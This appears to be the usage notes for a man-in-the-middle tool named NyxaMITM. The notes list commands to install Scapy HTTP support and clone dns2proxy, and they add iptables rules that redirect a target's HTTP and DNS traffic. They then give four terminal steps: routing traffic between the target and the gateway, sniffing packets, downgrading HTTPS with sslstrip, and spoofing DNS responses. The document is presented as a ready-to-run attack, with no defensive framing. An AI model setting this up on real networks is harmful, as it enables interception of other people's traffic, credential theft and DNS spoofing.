# NyxaMITM
# Example Usage : python3 nyxa_mitm.py -t 192.168.1.50 -r 192.168.1.1

# Install the required Scapy extension for HTTP packet analysis
pip3 install scapy_http

# Clone the proxy tool used for HTTPS simulation and DNS forwarding
git clone https://github.com/singe/dns2proxy

# Redirect HTTP (Port 80) traffic to the local analysis port (10000)
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

# Redirect DNS (Port 53) queries to the local DNS proxy service
iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53

Terminal 1	python3 nyxa_MITM.py -t 192.168.1.50 -r 192.168.1.1	The main module routing traffic between the Target (-t) and the Gateway (-r).
Terminal 2	python3 nyxa_packet_listener.py	The script responsible for sniffing the network interface (e.g., eth0) and analyzing packet content.
Terminal 3	sslstrip	The service that downgrades HTTPS traffic to HTTP for unencrypted processing.
Terminal 4	python dns2proxy.py	The proxy service that handles and routes modified DNS responses.
